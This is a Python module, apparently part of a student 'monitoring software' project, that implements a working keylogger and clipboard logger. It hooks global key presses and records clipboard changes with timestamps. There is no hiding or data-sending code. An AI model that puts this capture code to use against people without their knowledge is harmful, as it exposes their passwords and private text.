########################################################################################################################
#               This file should only contain all the code related to the keylogger and clipboard logger.              #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#               Code in this file should only be imported into monitorings_software.py.                                #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import keyboard as kb
import pyperclip as pc
import time


# Main code here
def event_to_string(event):
    if event.name == 'space':
        string = ' '
    elif event.name in kb.all_modifiers or event.name in ['tab', 'enter']:
        string = f"[{event.name.upper()}]"
    elif event.name != 'backspace':  # Should always be regular characters.
        string = event.name
    elif event.name == 'backspace':  # Separated from rest, to allow updates.
        string = '[BACKSPACE]'
    else:
        print(event.name)  # Should never happen.
        string = event.name

    return string


class KeysClipboardLogger:
    def __init__(self, csv_file, txt_file):
        self.old_clipboard = None
        self.current_clipboard = None
        self.working_file = csv_file
        self.current_keys_string = ''
        self.start_keylogger()

    def clipboard_changed(self):
        self.current_clipboard = pc.paste()
        if self.current_clipboard != self.old_clipboard:
            return True
        else:
            return False

    def log_clipboard(self):
        if type(self.current_clipboard) != str:
            data = "Clipboard contained non-string item."
        else:
            # Return only the important data, make one writerow in moso.py
            self.old_clipboard = self.current_clipboard
            data = self.current_clipboard
        return time.time(), data

    def start_keylogger(self):

        def on_press(event):
            self.current_keys_string += event_to_string(event)

        kb.on_press(on_press)

    def get_current_logged_keys(self):
        logged_string = self.current_keys_string
        self.current_keys_string = ''
        return logged_string


def main():
    """Tijdelijk de mogelijkheden van de kb library i.v.m. dat we nog niet weten hoe precies op te slaan.
    Poging tot het registreren van keys en het opslaan hiervan in een tekstbestand.

    Args:
        template_naam (type): Korte uitleg

    Returns:
        type: korte uitleg

    Bronnen:
        https://github.com/boppreh/keyboard#keyboard.get_typed_strings ==> keyboard library
        https://www.thepythoncode.com/article/control-keyboard-python ==> template / ideeën voor keylogger code
    """
    # [V] kb.start_recording() en recording = kb.stop_recording()
    # [V] events = keyboard.record('esc') ==> opnemen keypresses
    # [~] kb.is_modifier(key) ==> geeft aan of meegegeven key modifier is.
    # [~] print(list(kb.get_typed_strings(events))) ==> Print geen hotkeys.
    # [X] keyboard.play(events) ==> opnieuw afspelen keypresses
    # [X] kb.send((hot)key(s)) ==> Voert hotkey(s) uit
    # [X] kb.add_hotkey("hotkeys", lambda: functie()) ==> voert functie uit wanneer hotkey activeert.
    # [X] kb.is_pressed('ctrl') ==> controleert op specifieke key, wrs onnodig
    # [X] kb.write("string", delay=0.0) ==> Print string (bij eindgebruiker, niet in .txt)
    # [X] kb.block_key(key) ==> blokkeert gebruik van key.
    # [X] kb.remap_key(src,dst) ==> src omzetten naar dst


if __name__ == '__main__':
    main()
